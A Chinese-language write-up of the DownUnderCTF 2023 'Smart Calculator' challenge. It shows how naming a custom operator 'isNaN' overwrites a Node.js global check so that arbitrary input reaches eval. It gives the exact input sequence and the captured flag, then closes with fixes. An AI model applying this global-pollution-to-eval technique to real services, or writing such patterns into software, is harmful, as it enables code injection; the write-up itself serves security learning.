# DownUnderCTF 2023 Smart Calculator Writeup

## 题目简述

Node.js 计算器用 `global[op]` 缓存自定义运算，同时 `getNumber` 先调用全局函数 `Number`、`isNaN` 检查输入，再执行 `eval(input)`。自定义运算名完全可控，可以覆盖这些全局校验函数，使任意表达式进入 `eval`。

## 解题过程

选择“Calculator”，把运算符设为 `isNaN`。程序发现该运算尚未缓存后执行：

```javascript
global[op] = (op, val1, val2, result) => {
    try {
        global[op][val1 + " " + val2] = result;
    } catch (error) {
        console.error(error);
    }
};
```

于是原生 `global.isNaN` 被替换。最短交互序列为：

```text
1
isNaN
x
x
x
2
flag
```

最后选择“To Decimal”并输入 `flag`。`Number("flag")` 得到 `NaN`；被覆盖的 `isNaN` 虽在内部触发异常，但自己捕获异常并返回 `undefined`。因此三元表达式的条件为假，代码继续执行：

```javascript
eval("flag")
```

`flag` 是模块作用域中的常量，结果被打印为：

```text
DUCTF{i_l0v3_eVaL}
```

## 方法总结

漏洞由全局对象污染和 `eval` 共同造成。缓存键不应写入 `global`，更不应允许覆盖安全检查函数；此外，“先用 `Number` 检查再 eval”不是安全表达式解析。使用独立 `Map` 保存运算结果，并用语法明确的数学解析器替代 `eval` 才能切断利用链。
